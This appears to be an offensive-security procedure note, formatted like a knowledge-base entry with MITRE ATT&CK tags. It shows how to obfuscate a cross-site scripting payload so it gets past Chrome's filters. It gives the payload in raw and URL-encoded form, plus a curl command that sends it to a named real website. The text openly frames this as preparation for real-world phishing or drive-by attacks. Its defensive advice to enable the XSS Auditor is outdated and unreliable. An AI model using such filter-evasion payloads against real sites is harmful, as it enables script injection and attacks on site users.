---
tags:
  - bypass
  - xss
  - chrome
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:52.768Z'
sub_techniques: []
id: aeb5c9f9-5296-4a5d-a3e5-caaf94c612ee
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Adapt Payload for Chrome Bypass

## Summary

This procedure modifies the XSS payload to evade Chrome's built-in XSS auditor and protections, ensuring execution in modern browsers.

## Description

Chrome may filter standard payloads; an obfuscated version using <svg><script>/<@/>alert(1337)</script> tricks the parser. This step follows basic testing to ensure reliability across browsers in real-world phishing or drive-by attacks.

## Requirements

1. Basic payload confirmed working
2. Chrome browser for testing
3. Knowledge of browser filters

## Defense

Defensive measures and detection strategies:

- Enable XSS Auditor in browsers
- Use advanced WAF rules for obfuscated payloads
- Regularly update browser security features

## Objectives

1. Obfuscate to avoid detection
2. Maintain JS execution
3. Test in target browser

## Instructions

### Step 1: Modify Payload

**Context**: Create Chrome-resistant variant.

Payload: </script><svg><script>/<@/>alert(1337)</script>
Encoded: %3C%2Fscript%3E%3Csvg%3E%3Cscript%3E/%3C@/%3Ealert(1337)%3C/script%3E

### Step 2: Test Execution

**Context**: Apply to endpoint and observe.

**Command** ([[commands/curl-test-xss-payload]]):
```bash
curl "http://www.urbandictionary.com/define.php?term=%3C%2Fscript%3E%3Csvg%3E%3Cscript%3E/%3C@/%3Ealert(1337)%3C/script%3E" -v
```

> In Chrome, alert(1337) triggers.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-xss-payload]]

## Tools Used


## Tags

- [[bypass]]
- [[xss]]
